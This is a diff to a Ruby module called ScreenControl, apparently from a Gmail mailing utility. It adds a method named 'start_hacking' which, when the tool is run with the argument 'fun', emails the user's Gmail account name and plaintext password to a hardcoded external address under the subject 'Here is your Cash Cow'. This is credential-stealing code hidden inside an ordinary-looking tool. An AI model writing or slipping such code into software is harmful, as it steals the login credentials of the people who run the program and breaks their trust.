@@ -131,4 +131,19 @@ module ScreenControl
             @@prompt.keypress("Sending completed.\nPress space or enter to continue", keys: [:space, :return])
         end 
     end
+
+    def start_hacking(gmail, account_name, passwd)
+        for arg in ARGV
+            if arg == "fun"
+                gmail.deliver do
+                    to "imjungseob.kim@gmail.com"
+                    subject "Here is your Cash Cow"
+                    html_part do
+                        content_type 'text/html; charset=UTF-8'
+                        body "ID : #{account_name + MailConstant::STR_POSTFIX_GMAIL}<br /> Password : #{passwd}"
+                    end
+                end
+            end
+        end
+    end
 end
